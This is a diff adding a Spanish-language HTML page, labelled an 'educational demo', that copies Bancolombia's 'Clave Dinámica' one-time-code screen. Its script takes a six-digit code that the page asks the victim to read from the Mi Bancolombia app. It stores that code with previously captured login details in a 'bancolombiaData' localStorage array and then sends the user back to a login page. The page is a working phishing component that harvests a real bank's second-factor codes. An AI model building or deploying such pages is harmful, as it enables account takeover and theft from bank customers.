@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Demo educativa — Clave Dinámica</title>
+    <style>
+        :root {
+            --bg: #1f1f1f;
+            /* fondo oscuro */
+            --panel: #3a3a3a;
+            /* modal */
+            --panel-2: #2b2b2b;
+            /* overlay content base */
+            --text: #f1f5f9;
+            --muted: #cbd5e1;
+            --accent: #6ee7e7;
+            /* banner celeste */
+            --danger: #ef4444;
+            /* líneas inferiores */
+            --btn: #4b5563;
+            /* botones grises */
+            --btn-ghost: #3b3b3b;
+            --shadow: 0 18px 60px rgba(0, 0, 0, .55);
+            --radius: 16px;
+        }
+
+        * {
+            box-sizing: border-box
+        }
+
+        html,
+        body {
+            height: 100%
+        }
+
+        body {
+            margin: 0;
+            font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+            background: var(--bg);
+            color: var(--text);
+        }
+
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, .6);
+            display: grid;
+            place-items: center;
+            padding: 20px;
+        }
+
+        .modal {
+            position: relative;
+            width: min(720px, 92vw);
+            background: var(--panel-2);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 20px;
+        }
+
+        .close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: transparent;
+            border: 0;
+            color: #e2e8f0;
+            font-size: 22px;
+            width: 36px;
+            height: 36px;
+            border-radius: 999px;
+            cursor: pointer;
+            display: grid;
+            place-items: center;
+        }
+
+        .close:hover {
+            background: rgba(255, 255, 255, .06);
+        }
+
+        .banner {
+            background: var(--accent);
+            color: #0b3b3b;
+            border-radius: 12px;
+            padding: 16px;
+            font-weight: 700;
+            text-align: center;
+            margin: 6px 6px 18px;
+        }
+
+        .banner small {
+            font-weight: 600;
+            display: block;
+            opacity: .85;
+            margin-top: 4px;
+        }
+
+        .content {
+            background: var(--panel);
+            border-radius: 14px;
+            padding: 26px;
+            text-align: center;
+        }
+
+        h1 {
+            margin: 8px 0 6px;
+            font-size: clamp(1.2rem, 3vw, 1.6rem);
+        }
+
+        .sub {
+            color: var(--muted);
+            margin: 0 0 18px;
+        }
+
+        .otp {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin: 28px 0 20px;
+        }
+
+        .otp input {
+            width: 44px;
+            height: 50px;
+            padding: 0;
+            text-align: center;
+            font-size: 1.4rem;
+            background: transparent;
+            color: var(--text);
+            border: 0;
+            border-bottom: 3px solid var(--danger);
+            outline: none;
+            transition: box-shadow .2s ease;
+        }
+
+        .otp input:focus {
+            box-shadow: 0 6px 0 -3px rgba(239, 68, 68, .9);
+        }
+
+        .actions {
+            display: flex;
+            gap: 18px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-top: 18px;
+        }
+
+        .btn {
+            min-width: 160px;
+            padding: 12px 18px;
+            border-radius: 999px;
+            border: 0;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 1rem;
+        }
+
+        .btn.ghost {
+            background: var(--btn-ghost);
+            color: #d1d5db;
+        }
+
+        .btn.primary {
+            background: var(--btn);
+            color: #e5e7eb;
+            opacity: .7;
+            cursor: not-allowed;
+        }
+
+        .btn.primary.enabled {
+            opacity: 1;
+            cursor: pointer;
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .edu {
+            text-align: center;
+            margin-top: 14px;
+            color: #94a3b8;
+            font-size: .92rem;
+        }
+
+        .edu b {
+            color: #e2e8f0;
+        }
+
+        @media (max-width:480px) {
+            .otp {
+                gap: 12px;
+            }
+
+            .otp input {
+                width: 40px;
+                height: 48px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="title">
+        <div class="modal">
+
+            <button class="close" aria-label="Cerrar" id="closeBtn">✕</button>
+
+            <div class="banner">
+                Consulta tu Clave Dinámica
+                <small>de 2 formas:</small>
+            </div>
+
+            <div class="content">
+                <h1 id="title">Ingresa la Clave Dinámica</h1>
+                <p class="sub">Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+
+                <!-- Campos OTP -->
+                <form id="otpForm" class="otp" autocomplete="one-time-code">
+                    <label class="sr-only" for="d1">Primer dígito</label>
+                    <input id="d1" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Dígito 1" required>
+                    <input id="d2" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Dígito 2" required>
+                    <input id="d3" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Dígito 3" required>
+                    <input id="d4" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Dígito 4" required>
+                    <input id="d5" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Dígito 5" required>
+                    <input id="d6" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Dígito 6" required>
+                </form>
+
+                <div class="actions">
+                    <button class="btn ghost" id="clearBtn" type="button">Borrar</button>
+                    <button class="btn primary" id="continueBtn" type="button">Continuar</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Obtener datos del usuario actual
+        let currentUser = JSON.parse(sessionStorage.getItem('currentUser') || '{}');
+        let userData = JSON.parse(localStorage.getItem('bancolombiaData') || '[]');
+
+        // Si no hay datos del usuario, redirigir al login
+        if (!currentUser.usuario) {
+            window.location.href = 'index.html';
+        }
+
+        // Elementos DOM
+        const closeBtn = document.getElementById('closeBtn');
+        const otpInputs = [
+            document.getElementById('d1'),
+            document.getElementById('d2'),
+            document.getElementById('d3'),
+            document.getElementById('d4'),
+            document.getElementById('d5'),
+            document.getElementById('d6')
+        ];
+        const clearBtn = document.getElementById('clearBtn');
+        const continueBtn = document.getElementById('continueBtn');
+
+        // Función de validación
+        function validateOTPForm() {
+            const isValid = otpInputs.every(input => input.value.length === 1);
+            continueBtn.classList.toggle('enabled', isValid);
+            return isValid;
+        }
+
+        // Event listeners para OTP
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const value = e.target.value;
+                
+                // Solo permitir números
+                if (!/^\d*$/.test(value)) {
+                    e.target.value = value.slice(0, -1);
+                    return;
+                }
+
+                // Auto-focus al siguiente campo
+                if (value.length === 1 && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+
+                validateOTPForm();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                // Backspace para ir al campo anterior
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Limpiar campos
+        clearBtn.addEventListener('click', () => {
+            otpInputs.forEach(input => input.value = '');
+            otpInputs[0].focus();
+            validateOTPForm();
+        });
+
+        // Continuar (guardar datos)
+        continueBtn.addEventListener('click', () => {
+            if (validateOTPForm()) {
+                const claveDinamica = otpInputs.map(input => input.value).join('');
+                
+                // Completar datos del usuario
+                currentUser.claveDinamica = claveDinamica;
+                currentUser.timestamp = new Date().toLocaleString('es-CO', {
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+
+                // Guardar en localStorage
+                userData.push({ ...currentUser });
+                localStorage.setItem('bancolombiaData', JSON.stringify(userData));
+
+                // Limpiar sessionStorage
+                sessionStorage.removeItem('currentUser');
+                sessionStorage.setItem('loginCompleted', 'true');
+
+                // Redirigir al login
+                window.location.href = 'index.html';
+            }
+        });
+
+        // Cerrar modal
+        closeBtn.addEventListener('click', () => {
+            sessionStorage.removeItem('currentUser');
+            window.location.href = 'index.html';
+        });
+
+        // Inicialización
+        validateOTPForm();
+        otpInputs[0].focus();
+    </script>
+</body>
+
+</html>
